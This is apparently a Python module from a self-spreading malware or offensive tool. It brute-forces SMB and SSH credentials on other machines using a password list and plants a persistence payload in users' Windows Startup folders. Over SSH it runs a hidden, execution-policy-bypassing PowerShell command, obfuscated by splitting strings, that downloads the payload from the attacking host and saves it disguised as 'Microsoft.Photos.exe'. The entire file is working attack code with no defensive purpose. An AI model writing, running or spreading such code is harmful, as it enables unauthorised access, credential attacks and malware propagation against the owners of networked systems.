import os
from smb.SMBConnection import SMBConnection
import smb.base
from paramiko import SSHClient,AutoAddPolicy,AuthenticationException,SSHException
from passwords import windows_passwords
from platform import node
import socket
from Persistance.foothold import persist_in_startup
from Utils.helpers import startupFolder
from http.server import HTTPServer,SimpleHTTPRequestHandler
import wmi
persistance_fname = persist_in_startup()
client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())
wmi_os = wmi.WMI().Win32_ComputerSystem()[0]
my_hostname = node()
USERNAMES = [os.getlogin(), "Administrator"]
if wmi_os.PartOfDomain:
    domain_name = wmi_os.Domain
else:
    domain_name = ''

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return False

def smb_bruteforcer(ip, port=445, domain=''):
    flag_direct_tcp = False if port != 445 else True
    remote_host = get_hostname(ip)
    if not remote_host:
        return False
    for user in USERNAMES:
        for password in windows_passwords:
            connection = SMBConnection(user, password, my_name=my_hostname, remote_name=remote_host,
                                       is_direct_tcp=flag_direct_tcp, domain=domain)
            if connection.connect(ip, port):
                print('[*] We Got {} with {}:{}', {ip, user, password})
                for share in connection.listShares():
                    if share.type == smb.base.SharedDevice.DISK_TREE:
                        if user != 'Administrator':
                            path = f"/users/{user}/appdata/roaming/microsoft/windows/start menu/programs/startup/"
                            connection.createDirectory(share.name, path)
                            connection.storeFile(share.name, path, persistance_fname)
                            print('[*] We Dropped {} on {}/{} '.format(persistance_fname, ip, path))
                            return True
    return False


def smb_brute(ip):
    if domain_name:
        smb_bruteforcer(ip, domain=domain_name)
    else:
        smb_bruteforcer(ip)
    return

def server_http(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

def drop_on_ssh(host,user,password):
    client.connect(hostname=host,username=user,password=password)
    httpd = HTTPServer(('0.0.0.0', 8951), SimpleHTTPRequestHandler)
    powershell_dropper_command = f""" IEX("i"+"w"+"r"+" " + "-U"+"r"+"i" + " h"+"t"+"t"+"p"+":"+"/"+"/"+"{socket.gethostname}:8951/{os.path.basename(persistance_fname)}") -OutFile {os.path.join(startupFolder.format(os.getlogin(),"Microsoft.Photos.exe"))}"""
    httpd.serve_forever()
    client.exec_command(f"powershell -ep bP -windowstyle hidden {powershell_dropper_command} ")
    httpd.server_close()
    client.close()
    return True

def ssh_bruteforcer(ip):
    remote_host = get_hostname(ip)
    if not remote_host:
        return False
    for user in USERNAMES:
        for password in windows_passwords:
            try:
                client.connect(hostname=remote_host,username=user,password=password)
            except socket.timeout:
                continue
            except AuthenticationException:
                continue
            except SSHException:
                continue
            print("[*] Connected to {}  as {} with password {} in SSH".format(ip,user,password))
            if r"C:\Windows\system32" in client.exec_command("path")[1].read().decode():
                client.close()
                drop_on_ssh(remote_host,user,password)
                #drop on ssh
